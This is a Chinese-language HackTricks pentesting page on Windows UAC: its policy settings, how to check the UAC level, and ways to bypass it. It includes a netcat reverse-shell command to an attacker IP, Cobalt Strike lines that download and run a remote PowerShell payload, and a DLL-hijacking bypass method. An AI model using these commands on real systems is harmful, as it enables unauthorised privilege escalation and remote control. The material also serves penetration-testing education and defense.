# UAC - 用户账户控制

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[用户账户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，它启用了**提升活动的同意提示**。应用程序具有不同的`integrity`级别，具有**高级别**的程序可以执行**可能危害系统的任务**。当UAC启用时，应用程序和任务始终**在非管理员账户的安全上下文下运行**，除非管理员明确授权这些应用程序/任务以管理员级别的访问权限在系统上运行。它是一个便利功能，可以保护管理员免受意外更改，但不被视为安全边界。

有关完整性级别的更多信息：

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

当UAC到位时，管理员用户会获得两个令牌：一个标准用户密钥，用于以常规级别执行常规操作，以及一个具有管理员权限的密钥。

此[页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)深入讨论了UAC的工作原理，包括登录过程、用户体验和UAC架构。管理员可以使用安全策略来配置UAC的工作方式，以适应其组织在本地级别（使用secpol.msc），或者通过在Active Directory域环境中的组策略对象（GPO）配置和推送。各种设置在[此处](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)详细讨论。有10个组策略设置可以为UAC设置。下表提供了更多细节：

| 组策略设置                                                                                                                                                                                                                                                                                                                                                           | 注册表键                | 默认设置                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [用户账户控制：内置管理员账户的管理员批准模式](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 禁用                                                     |
| [用户账户控制：允许UIAccess应用程序在不使用安全桌面的情况下提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 禁用                                                     |
| [用户账户控制：管理员批准模式下管理员的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 对非Windows二进制文件提示同意                  |
| [用户账户控制：标准用户的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 在安全桌面上提示凭据                 |
| [用户账户控制：检测应用程序安装并提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 启用（家庭版默认）禁用（企业版默认） |
| [用户账户控制：仅提升已签名并验证的可执行文件](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 禁用                                                     |
| [用户账户控制：仅提升安装在安全位置的UIAccess应用程序](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 启用                                                      |
| [用户账户控制：以管理员批准模式运行所有管理员](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 启用                                                      |
| [用户账户控制：在提示提升时切换到安全桌面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 启用                                                      |
| [用户账户控制：将文件和注册表写入失败虚拟化到每个用户的位置](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 启用                                                      |

### UAC绕过理论

如果**用户属于** **管理员组**，某些程序会**自动提升**。这些二进制文件在其_**清单**_中具有_**autoElevate**_选项，值为_**True**_。二进制文件还必须由Microsoft**签名**。

因此，为了**绕过** **UAC**（从**中等**完整性级别**提升到高**），一些攻击者使用这类二进制文件来**执行任意代码**，因为它将从**高完整性级别进程**执行。

您可以使用Sysinternals的工具_**sigcheck.exe**_ **检查**二进制文件的_**清单**_。您可以使用_Process Explorer_或_Process Monitor_（Sysinternals的工具）**查看**进程的**完整性级别**。

### 检查UAC

要确认UAC是否启用，请执行：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
如果是**`1`**，则UAC处于**激活**状态，如果是**`0`**或者**不存在**，则UAC处于**非激活**状态。

然后，检查配置了**哪个级别**：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* 如果 **`0`** 则，UAC不会提示（如同**禁用**）
* 如果 **`1`** 管理员需要输入用户名和密码来以高权限执行二进制文件（在安全桌面上）
* 如果 **`2`**（**始终通知我**）UAC将始终要求管理员在尝试以高权限执行某些操作时确认（在安全桌面上）
* 如果 **`3`** 类似于 `1` 但不必在安全桌面上
* 如果 **`4`** 类似于 `2` 但不必在安全桌面上
* 如果 **`5`**（**默认**）它会要求管理员确认运行非Windows二进制文件以高权限

然后，你需要查看 **`LocalAccountTokenFilterPolicy`** 的值\
如果值是 **`0`**，那么，只有 **RID 500** 用户（**内置管理员**）能够执行**不经UAC的管理员任务**，如果是 `1`，**"管理员"** 组内的**所有账户**都可以执行它们。

最后，查看键 **`FilterAdministratorToken`** 的值\
如果 **`0`**（默认），**内置管理员账户可以**执行远程管理任务，如果是 **`1`** 内置管理员账户**不能**执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 设置为 `1`。

#### 总结

* 如果 `EnableLUA=0` 或**不存在**，**任何人都没有UAC**
* 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=1`，任何人都没有UAC**
* 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=0` 且 `FilterAdministratorToken=0`，RID 500（内置管理员）没有UAC**
* 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=0` 且 `FilterAdministratorToken=1`，每个人都有UAC**

所有这些信息可以使用 **metasploit** 模块收集：`post/windows/gather/win_privs`

你也可以检查你的用户所在的组并获取完整性级别：
```
net user %username%
whoami /groups | findstr Level
```
## UAC 绕过

{% hint style="info" %}
请注意，如果您可以图形化地访问受害者，UAC 绕过是直截了当的，因为当 UAS 提示出现时，您可以简单地点击“是”。
{% endhint %}

在以下情况下需要 UAC 绕过：**UAC 被激活，您的进程在中等完整性上下文中运行，且您的用户属于管理员组**。

重要的是要提到，如果 UAC 处于最高安全级别（始终），绕过 UAC **要比在任何其他级别（默认）更难**。

### UAC 已禁用

如果 UAC 已经被禁用（`ConsentPromptBehaviorAdmin` 是 **`0`**），您可以使用类似的方法**执行具有管理员权限的反向 shell**（高完整性级别）：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC绕过与令牌复制

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常**基础的UAC“绕过”（完整文件系统访问）

如果你拥有一个用户的shell，而该用户位于Administrators组中，你可以通过SMB（文件系统）**挂载C$**共享到本地新磁盘，你将能够**访问文件系统内的所有内容**（甚至包括Administrator的主文件夹）。

{% hint style="warning" %}
**看起来这个技巧已经不再有效**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 Cobalt Strike 绕过 UAC

如果 UAC 没有设置为最高安全级别，Cobalt Strike 技术才会有效
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有多个模块用于**绕过** **UAC**。

### KRBUACBypass

文档和工具在 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC 绕过漏洞利用

[**UACME**](https://github.com/hfiref0x/UACME) 是多个UAC绕过漏洞的**编译集合**。请注意，您需要使用visual studio或msbuild**编译UACME**。编译将创建多个可执行文件（如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），您需要知道**您需要哪一个**。\
您应该**小心**，因为某些绕过会**提示其他程序**，这将**警告** **用户**有事情正在发生。

UACME有**从每种技术开始有效的构建版本**。您可以搜索影响您版本的技术：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
```markdown
此外，使用[此页面](https://en.wikipedia.org/wiki/Windows_10_version_history)您可以从构建版本中获取Windows发布`1607`。

#### 更多UAC绕过

**所有**在此处使用的技术绕过AUC **需要**与受害者有一个**完全交互式的shell**（常见的nc.exe shell是不够的）。

您可以使用**meterpreter**会话获得。迁移到一个**进程**，其**Session**值等于**1**：

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ 应该可以工作)

### 使用GUI绕过UAC

如果您可以访问**GUI，您只需在收到UAC提示时接受它**，您实际上不需要绕过它。因此，获取对GUI的访问将允许您绕过UAC。

此外，如果您获得某人正在使用的GUI会话（可能通过RDP），那么将有一些**工具将以管理员身份运行**，您可以从中**运行**例如**cmd**作为管理员直接而不会再次被UAC提示，如[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能会更加**隐蔽**。

### 嘈杂的暴力破解UAC绕过

如果您不在乎制造噪音，您可以始终**运行类似** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 的东西，它会**要求提升权限直到用户接受它**。

### 您自己的绕过 - 基本UAC绕过方法论

如果您查看**UACME**，您会注意到**大多数UAC绕过都是滥用Dll劫持漏洞**（主要是在_C:\Windows\System32_上写入恶意dll）。[阅读此内容以了解如何找到Dll劫持漏洞](../windows-local-privilege-escalation/dll-hijacking.md)。

1. 找到一个将**自动提升**的二进制文件（检查当它被执行时它在高完整性级别中运行）。
2. 使用procmon找到可能对**DLL劫持**易受攻击的“**NAME NOT FOUND**”事件。
3. 您可能需要将DLL**写入**一些**受保护的路径**（如C:\Windows\System32），您没有写入权限。您可以使用以下方法绕过此限制：
   1. **wusa.exe**：Windows 7,8 和 8.1。它允许在受保护的路径内提取CAB文件的内容（因为这个工具是从高完整性级别执行的）。
   2. **IFileOperation**：Windows 10。
4. 准备一个**脚本**来复制您的DLL到受保护的路径并执行易受攻击且自动提升的二进制文件。

### 另一种UAC绕过技术

包括监视**自动提升的二进制文件**是否尝试从**注册表**中**读取**要**执行**的**二进制文件**或**命令**的**名称/路径**（如果二进制文件在**HKCU**内搜索此信息则更有趣）。

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进**的社区工具提供支持。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
```
